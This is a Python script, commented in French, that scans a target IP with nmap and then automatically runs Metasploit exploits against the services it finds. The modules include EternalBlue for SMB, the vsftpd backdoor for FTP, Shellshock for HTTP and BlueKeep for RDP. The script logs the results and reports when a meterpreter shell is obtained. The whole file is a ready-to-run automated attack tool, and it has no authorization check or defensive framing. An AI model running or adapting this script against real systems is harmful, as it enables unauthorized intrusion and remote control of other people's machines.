import subprocess
import sys
from colorama import Fore, Style, init

# Initialisation de colorama
init()

# Fonction pour scanner les ports et services d'une cible donnée
def scan_ports(target):
    print(Fore.GREEN + "Scanning common ports...", Style.RESET_ALL)
    command = ["nmap", "-p 1-1000", "-sV", "-T4", target]
    
    # Exécuter la commande via subprocess et capturer la sortie
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode != 0:
        print(Fore.RED + f"Erreur : {result.stderr}" + Style.RESET_ALL)
        return []
    
    # Afficher directement la sortie dans le terminal
    print(Fore.CYAN + result.stdout + Style.RESET_ALL)
    
    results = []
    for line in result.stdout.splitlines():
        if "/tcp" in line or "/udp" in line:
            parts = line.split()
            port = parts[0]
            service = parts[2] if len(parts) > 2 else "unknown"
            results.append((target, port, service))
    
    return results

# Fonction pour exploiter une vulnérabilité
def exploit_vulnerability(target, port, service, report_file):
    exploit_command = None
    if service == "smb" or service == "microsoft-ds" or port == "445":
        # Exploit pour MS17-010
        exploit_command = f"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "ftp":
        exploit_command = f"use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service in ["http", "https"]:
        exploit_command = f"use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "ssh":
        exploit_command = f"use exploit/linux/ssh/sshexec\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "mysql":
        exploit_command = f"use auxiliary/scanner/mysql/mysql_login\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "mssql":
        exploit_command = f"use exploit/windows/mssql/ms09_004_sp_replwritetovarbin\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "rdp":
        exploit_command = f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    elif service == "python":
        exploit_command = f"use exploit/multi/http/pyhttpd_sqli\nset RHOSTS {target}\nset RPORT {port}\nrun\n"
    else:
        with open(report_file, "a") as f:
            f.write(f"No known exploit for service: {service} on port {port}\n")
        print(Fore.YELLOW + f"No known exploit for service: {service} on port {port}" + Style.RESET_ALL)
        return False

    if exploit_command:
        print(Fore.BLUE + "Exploiting vulnerabilities...", Style.RESET_ALL)
        result = subprocess.run(
            ["msfconsole", "-q", "-x", exploit_command], capture_output=True, text=True
        )
        with open(report_file, "a") as f:
            f.write(result.stdout)
        if "meterpreter session" in result.stdout:
            print(Fore.GREEN + f"Successfully exploited {target} on port {port}. Shell obtained." + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Failed to exploit {target} on port {port}." + Style.RESET_ALL)
        return True
    else:
        print(Fore.YELLOW + f"No known exploit for service: {service} on port {port}" + Style.RESET_ALL)
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Fore.RED + "Usage: python exploit_vulns.py <target_ip>" + Style.RESET_ALL)
        sys.exit(1)

    target_ip = sys.argv[1]
    report_file = "scan_exploit_report.txt"

    open(report_file, "w").close()

    # Étape 1 : Scanner les ports et services
    ports_services = scan_ports(target_ip)

    # Étape 2 : Exploiter les vulnérabilités identifiées
    for host, port, service in ports_services:
        if not exploit_vulnerability(host, port, service, report_file):
            with open(report_file, "a") as f:
                f.write(f"Protocol {service} on port {port} is not vulnerable or exploitable.\n")
            print(Fore.YELLOW + f"Protocol {service} on port {port} is not vulnerable or exploitable." + Style.RESET_ALL)
